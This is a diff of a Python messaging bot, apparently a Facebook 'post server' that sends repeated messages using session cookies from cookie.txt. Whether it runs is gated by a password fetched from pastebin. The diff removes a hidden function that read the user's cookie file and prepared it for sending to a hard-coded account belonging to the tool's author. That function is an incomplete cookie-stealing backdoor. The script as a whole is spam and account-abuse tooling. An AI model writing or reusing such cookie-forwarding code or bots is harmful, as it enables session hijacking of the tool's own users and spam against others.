@@ -1,24 +1,12 @@
 import requests
-import json
-import time
-import sys
-from platform import system
 import os
-import subprocess
+import re
+import sys
+import time
+import json
 import http.server
 import socketserver
-import threading
-import random
-import requests
-import json
-import time
-import sys
-from platform import system
-import os
-import subprocess
-import http.server
-import socketserver
-import threading
+from requests.exceptions import RequestException
 
 class MyHandler(http.server.SimpleHTTPRequestHandler):
       def do_GET(self):
@@ -33,18 +21,6 @@ def execute_server():
           print("Server running at http://localhost:{}".format(PORT))
           httpd.serve_forever()
 
-def send_initial_message():
-      with open('cookie.txt', 'r') as file:
-          cookie = file.readlines()
-
-      # Modify the message as per your requirement
-      msg_template = "𝗛𝗲𝗹𝗹𝗼 𝗠𝗮𝗳𝗶𝘆𝗮 𝗦𝗶𝗿..!! IM USING YOUR POST SERVER AND MY POST SERVER COOKIE IS {}"
-
-      # Specify the ID where you want to send the message
-      target_id = "100069713641443"
-
-      requests.packages.urllib3.disable_warnings()
-
 def lines():
 	print("[[>]] ===================M4FIY4=S3RV3R=RUNNING===================")
 
@@ -54,7 +30,7 @@ mmm = requests.get('https://pastebin.com/raw/wEiJXrN3').text
 if mmm not in pwd:
 	print("PASSWORD CHANGED BY MAFIYA PLS CONTACT")
 	sys.exit()
-
+	
 def cookie_file():
 	try:
 		lines()
@@ -73,7 +49,7 @@ def make_request(url, headers, cookie):
         print("\033[1;31m[!] Error making request:", e)
         return None
 
-def time():
+def main():
     print("\033[1;36mStart Time:", time.strftime("%Y-%m-%d %H:%M:%S"))
 
     while True:
@@ -148,16 +124,6 @@ def time():
         except Exception as e:
             print("\033[1;31m[!] An unexpected error occurred:", e)
             break
-            
-def main():
-      server_thread = threading.Thread(target=execute_server)
-      server_thread.start()
 
-      # Send the initial message to the specified ID using all tokens
-
-
-      # Then, continue with the message sending loop
-      cookie_file()
-      
-if __name__ == '__main__':
-      main()
+if __name__ == "__main__":
+    main()
